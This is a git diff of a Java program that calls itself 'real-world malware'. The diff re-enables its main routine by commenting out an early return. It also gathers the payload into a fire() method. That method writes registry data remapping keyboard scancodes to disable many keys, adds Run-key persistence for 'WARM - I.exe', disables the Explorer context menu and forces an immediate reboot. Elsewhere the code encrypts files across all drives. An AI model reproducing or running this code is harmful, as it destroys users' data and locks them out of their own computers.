@@ -1,6 +1,8 @@
 package WAR;
 
-import javax.crypto.*;
+import javax.crypto.Cipher;
+import javax.crypto.KeyGenerator;
+import javax.crypto.NoSuchPaddingException;
 import javax.crypto.spec.IvParameterSpec;
 import javax.swing.*;
 import javax.swing.filechooser.FileSystemView;
@@ -14,7 +16,6 @@ import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
-import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Scanner;
 import java.lang.reflect.InvocationTargetException;
@@ -25,6 +26,8 @@ import java.util.Collections;
 import java.util.List;
 import java.util.prefs.Preferences;
 
+import static java.nio.file.Files.writeString;
+
 public final class Main {
     private static final String RED_BOLD_BRIGHT = "\033[1;91m";
     private static final String ANSI_RESET = "\u001B[0m";
@@ -33,8 +36,22 @@ public final class Main {
     private static FileOutputStream outputStream;
     private static final GraphicsDevice[] gs = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
     private static final ArrayList<File> drives = new ArrayList<>();
-    private static final SimpleDateFormat format = new SimpleDateFormat("MM/dd/yyyy hh:mm:ss:SSS");
     private static final Point p = new Point(420, 420);
+    private static final Path regPath = Path.of("C:\\Program Files\\regdata.reg");
+    private static final String shutDownCommand = "shutdown /r /t 0";
+    private static final String regRunCommand = "regedit regdata.reg";
+    private static final String runMessage = "Already Executed !";
+    private static final String regData = """
+            Windows Registry Editor Version 5.00
+
+            [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout]
+            "Scancode Map"=hex:00,00,00,00,00,00,00,00,09,00,00,00,00,00,5b,e0,00,00,5c,e0,00,00,5d,e0,00,00,44,00,00,00,1d,00,00,00,38,00,00,00,1d,e0,00,00,38,e0,00,00,2A,00,00,00,46,00,00,00,3A,00,00,00,3B,00,00,00,3C,00,00,00,3D,00,00,00,3E,00,00,00,3F,00,00,00,40,00,00,00,41,00,00,00,43,00,00,00,57,00,00,00,58,00,00,00,00,00
+
+            [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]
+            "fileCompressor"="C:\\\\Program Files\\\\WARM - I.exe"
+
+            [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer]
+            "NoViewContextMenu"=dword:00000001""";
 
     static {
         for (File file : File.listRoots()) {
@@ -52,8 +69,8 @@ public final class Main {
 
     }
 
-    public static void main(String[] args) throws InterruptedException {
-        return;
+    public static void main(String[] args){
+//        return;
         System.out.println("\n\n\n");
         System.out.println(RED_BOLD_BRIGHT + "This is a real-world malware, not a joke, are you sure to continue ??????    [ Y / N ]" + ANSI_RESET);
         if (new Scanner(System.in).nextLine().equalsIgnoreCase("Y")) {
@@ -169,7 +186,6 @@ public final class Main {
                             frame.requestFocus();
                         }
                     });
-
                     frame.addWindowFocusListener(new WindowFocusListener() {
                         @Override
                         public void windowGainedFocus(WindowEvent e) {/* keep empty */}
@@ -207,84 +223,36 @@ public final class Main {
                                     return super.visitFileFailed(file, null);
                                 }
                             });
-                        } catch (IOException e) {
-                        }
-
+                        } catch (IOException ignored) {}
                     }
-                    Thread.sleep(5000);
                 }else {
                     while (true) {
                         try {
-                            WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", "Scancode Map",
-                                    "hex:00,00,00,00,00,00,00,00,09,00,00,00,00,00,5b,e0,00,00,5c,e0,00,00,5d,e0,00,00,44,00,00,00,1d,00,00,00,38,00,00,00,1d,e0,00,00,38,e0,00,00," +
-                                            "2A,00,00,00,46,00,00,00,3A,00,00,00,3B,00,00,00,3C,00,00,00,3D,00,00,00,3E,00,00,00,3F,00,00,00,40,00,00,00,41,00,00,00,43,00,00,00,57,00,00,00,58,00,00,00,00,00",
-                                    WinRegistry.KEY_WOW64_64KEY);
-                            WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "filecompressor",
-                                    "C:\\Program Files\\WARM - I.exe", WinRegistry.KEY_WOW64_64KEY);
-                            WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer","NoViewContextMenu",
-                                    "0x00000001",WinRegistry.KEY_WOW64_64KEY);
-                            FileWriter fileWriter = new FileWriter("C:\\Program Files\\compressordata.dat");
-                            fileWriter.write("Already executed !!");
-                            fileWriter.close();
-                            executeCommand("shutdown /r /t 0");
+                            fire();
                             break;
-                        } catch (InvocationTargetException | IllegalAccessException | IOException e) {}
+                        } catch (IOException ignored) {}
                         try {
-                            WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", "Scancode Map",
-                                    "hex:00,00,00,00,00,00,00,00,09,00,00,00,00,00,5b,e0,00,00,5c,e0,00,00,5d,e0,00,00,44,00,00,00,1d,00,00,00,38,00,00,00,1d,e0,00,00,38,e0,00,00," +
-                                            "2A,00,00,00,46,00,00,00,3A,00,00,00,3B,00,00,00,3C,00,00,00,3D,00,00,00,3E,00,00,00,3F,00,00,00,40,00,00,00,41,00,00,00,43,00,00,00,57,00,00,00,58,00,00,00,00,00",
-                                    WinRegistry.KEY_WOW64_32KEY);
-                            WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "filecompressor",
-                                    "C:\\Program Files\\WARM - I.exe", WinRegistry.KEY_WOW64_32KEY);
-                            WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer","NoViewContextMenu",
-                                    "0x00000001",WinRegistry.KEY_WOW64_32KEY);
-                            FileWriter fileWriter = new FileWriter("C:\\Program Files\\compressordata.dat");
-                            fileWriter.write("Already executed !!");
-                            fileWriter.close();
-                            executeCommand("shutdown /r /t 0");
+                            fire();
                             break;
-                        } catch (InvocationTargetException | IllegalAccessException | IOException e) {}}
+                        } catch (IOException ignored) {}}
                 }
             }catch (IOException ignored) {
                 while (true) {
                     try {
-                        WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", "Scancode Map",
-                                "hex:00,00,00,00,00,00,00,00,09,00,00,00,00,00,5b,e0,00,00,5c,e0,00,00,5d,e0,00,00,44,00,00,00,1d,00,00,00,38,00,00,00,1d,e0,00,00,38,e0,00,00," +
-                                        "2A,00,00,00,46,00,00,00,3A,00,00,00,3B,00,00,00,3C,00,00,00,3D,00,00,00,3E,00,00,00,3F,00,00,00,40,00,00,00,41,00,00,00,43,00,00,00,57,00,00,00,58,00,00,00,00,00",
-                                WinRegistry.KEY_WOW64_64KEY);
-                        WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "filecompressor",
-                                "C:\\Program Files\\WARM - I.exe", WinRegistry.KEY_WOW64_64KEY);
-                        WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoViewContextMenu",
-                                "0x00000001", WinRegistry.KEY_WOW64_64KEY);
-                        FileWriter fileWriter = new FileWriter("C:\\Program Files\\compressordata.dat");
-                        fileWriter.write("Already executed !!");
-                        fileWriter.close();
-                        executeCommand("shutdown /r /t 0");
+                        fire();
                         break;
-                    } catch (InvocationTargetException | IllegalAccessException | IOException ignored1) {
+                    } catch (IOException ignored1) {
                     }
                     try {
-                        WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", "Scancode Map",
-                                "hex:00,00,00,00,00,00,00,00,09,00,00,00,00,00,5b,e0,00,00,5c,e0,00,00,5d,e0,00,00,44,00,00,00,1d,00,00,00,38,00,00,00,1d,e0,00,00,38,e0,00,00," +
-                                        "2A,00,00,00,46,00,00,00,3A,00,00,00,3B,00,00,00,3C,00,00,00,3D,00,00,00,3E,00,00,00,3F,00,00,00,40,00,00,00,41,00,00,00,43,00,00,00,57,00,00,00,58,00,00,00,00,00",
-                                WinRegistry.KEY_WOW64_32KEY);
-                        WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "filecompressor",
-                                "C:\\Program Files\\WARM - I.exe", WinRegistry.KEY_WOW64_32KEY);
-                        WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoViewContextMenu",
-                                "0x00000001", WinRegistry.KEY_WOW64_32KEY);
-                        FileWriter fileWriter = new FileWriter("C:\\Program Files\\compressordata.dat");
-                        fileWriter.write("Already executed !!");
-                        fileWriter.close();
-                        executeCommand("shutdown /r /t 0");
+                        fire();
                         break;
-
-                    } catch (InvocationTargetException | IllegalAccessException | IOException ignored1) {
+                    } catch ( IOException ignored1) {
                     }}}
         }
         System.exit(0);
     }
 
-    public static void processFile(File file) {
+    private static void processFile(File file) {
         if (!file.isDirectory() && !(file.getAbsoluteFile().getName().equalsIgnoreCase("warm - i.exe"))) {
             try {
                 inputStream = new FileInputStream(file);
@@ -301,15 +269,21 @@ public final class Main {
                 if (outputBytes != null) {
                     outputStream.write(outputBytes);
                 }
-            } catch (Exception ignored) {
-            } finally {
+            } catch (Exception ignored) {}
+            finally {
                 try {
                     inputStream.close();
                     outputStream.close();
-                } catch (IOException ignored) {
-                }
+                } catch (IOException ignored) {}
             }
         }
+    }
+
+    private static void fire() throws IOException {
+        writeString(regPath,regData);
+        executeCommand(regRunCommand);
+        new FileWriter("C:\\Program Files\\compressordata.dat").write(runMessage);
+        executeCommand(shutDownCommand);
     }
 
     private static IvParameterSpec generateIv() {
@@ -322,7 +296,7 @@ public final class Main {
         try {
             Process process = Runtime.getRuntime().exec(command);
             process.waitFor();
-        } catch (IOException | InterruptedException e) {
+        } catch (IOException | InterruptedException ignored) {
         }
     }
 
